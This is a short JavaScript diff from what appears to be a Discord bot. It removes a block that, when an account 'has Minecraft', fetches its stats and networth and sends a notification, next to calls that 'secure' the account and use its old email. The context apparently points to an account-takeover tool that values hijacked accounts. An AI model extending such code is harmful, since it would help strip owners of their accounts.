@@ -291,36 +291,6 @@ let obj = {
 
               let neededmsg = failed ? failedmsg : msg
 
-              // Send notification if account has Minecraft
-              if (acc.newName && acc.newName !== "No Minecraft!" && hasMinecraft) {
-                try {
-                  console.log('[USER-DETAILS] Account has Minecraft, preparing notification...');
-                  console.log('[USER-DETAILS] Minecraft name:', acc.newName);
-                  const stats = await getStats(acc.newName);
-                  console.log('[USER-DETAILS] Stats retrieved:', stats);
-                  const accountData = {
-                    username: acc.newName,
-                    networth: stats?.networth || '0',
-                    bedwars: stats?.bedwars?.level || '0',
-                    networkLevel: stats?.networkLevel || '0',
-                    sbLevel: stats?.sbLevel || '0',
-                    duelKDR: stats?.duelKDR || '0',
-                    duelWinstreak: stats?.duelWinstreak || '0',
-                    plusColour: stats?.plusColour || 'None',
-                    gifted: stats?.gifted || '0'
-                  };
-                  console.log('[USER-DETAILS] Sending notification for:', accountData.username);
-                  await sendSecureNotification(client, accountData);
-                  console.log('[USER-DETAILS] Notification sent successfully');
-
-                } catch (notifError) {
-                  console.log('[USER-DETAILS] Failed to send notification:', notifError.message);
-                  console.error('[USER-DETAILS] Notification error details:', notifError);
-                }
-              } else {
-                console.log('[USER-DETAILS] Account has no Minecraft, skipping notification');
-              }
-
               let doneaftersecure = await aftersecure(neededmsg, acc.aftersecure, interaction.user.id, settings, client, server_id, client.username, acc.oldEmail, acc);
               if (doneaftersecure) {
                 console.log('Did AfterSecure!');
